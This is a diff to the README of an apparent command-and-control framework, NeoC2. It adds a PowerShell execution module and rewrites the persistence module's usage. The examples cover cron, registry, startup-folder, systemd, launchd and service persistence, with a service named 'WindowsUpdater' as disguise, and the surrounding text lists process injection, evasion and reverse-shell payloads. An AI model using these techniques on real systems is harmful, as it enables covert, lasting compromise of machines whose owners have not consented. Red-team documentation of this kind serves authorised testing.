@@ -11,10 +11,11 @@
 - [Evasion Techniques](#evasion-techniques)
 - [File Operations](#file-operations)
 - [Task Chaining](#task-chaining-web-ui-only)
+- [Powershell](#powershell)
 - [Inline-Execute](#inline-execute)
 - [PInject](#pinject)
 - [PEInject](#peinject)
-- [Persistence](#persistence)
+- [Persist](#persist)
 - [Event Monitoring](#event-monitoring)
 - [Security Features](#security-features)
 - [Autocompletion](#autocompletion)
@@ -475,6 +476,15 @@ NeoC2 provides advanced task chaining capabilities, allowing operators to create
    - Service installation
    - File system persistence
 
+## Powershell
+
+This `pwsh` module helps run their own extendible powershell scripts on a Windows machine
+
+### Basic Usage:
+
+```
+pwsh <script_path> [agent_id=<agent_id>] [arguments=<script_arguments>]
+```
 
 ## Inline-Execute
 
@@ -582,9 +592,9 @@ run peinject pe_file=<payload_path> [agent_id=<agent_id>] # METHOD - 2 (Non-inte
 - windows/x64/shell_reverse_tcp
 - windows/x64/meterpreter/reverse_tcp
 
-## Persistence
+## Persist
 
-This is primarily a module that helps operators establishes persistence on systems using various techniques `modules info persistence`
+This module helps operators establishes persistence on systems using various techniques `modules info persistence`
 
 #### Required Options:
 - `agent_id`: ID of the agent to establish persistence on
@@ -597,34 +607,27 @@ This is primarily a module that helps operators establishes persistence on syste
 
 #### Usage:
 
-**Linux/macOS Cron Persistence:**
 ```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=cron payload_path=/tmp/payload.sh
-```
+# In interactive mode, the agent ID is automatically inferred:
+persist <method> <payload_path> [agent_id=<agent_id>] [name=<persistence_name>] [interval=<minutes>]
 
-**Windows Registry Persistence:**
-```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=registry payload_path=C:\Users\Public\payload.exe
-```
+# Linux/macOS Cron Persistence:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=cron payload_path=/tmp/payload.sh
 
-**Windows Startup Folder:**
-```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=startup payload_path=C:\Users\Public\payload.exe
-```
+# Windows Registry Persistence:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=registry payload_path=C:\Users\Public\payload.exe
 
-**Windows Service:**
-```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=service payload_path=C:\Users\Public\payload.exe name=WindowsUpdater
-```
+# Windows Startup Folder:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=startup payload_path=C:\Users\Public\payload.exe
 
-**Linux Systemd Service:**
-```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=systemd payload_path=/opt/payload service_interval=30
-```
+# Windows Service:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=service payload_path=C:\Users\Public\payload.exe name=WindowsUpdater
 
-**macOS LaunchAgent:**
-```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=launchd payload_path=/Applications/payload.sh
+Linux Systemd Service:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=systemd payload_path=/opt/payload service_interval=30
+
+macOS LaunchAgent:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=launchd payload_path=/Applications/payload.sh
 ```
 
 
